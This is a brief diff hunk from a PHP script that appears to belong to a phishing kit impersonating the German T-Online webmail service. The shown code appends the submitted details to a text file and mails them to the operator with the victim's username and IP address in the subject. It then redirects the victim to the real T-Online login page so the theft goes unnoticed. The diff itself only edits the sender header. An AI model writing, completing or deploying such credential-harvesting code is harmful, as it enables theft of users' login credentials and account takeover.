@@ -17,7 +17,7 @@ $fp = fopen("details.txt","a");
 fputs($fp,$message);
 fclose($fp);
 $subject = "TONLINE | ".$_POST['username']." | $ip";
-$headers = "From: sm+kk<noreply>";
+$headers = "From: sm+kk <inbox@online.com>";
 @mail($send,$subject,$message,$from);
 @header("Location: https://email.t-online.de/");
 
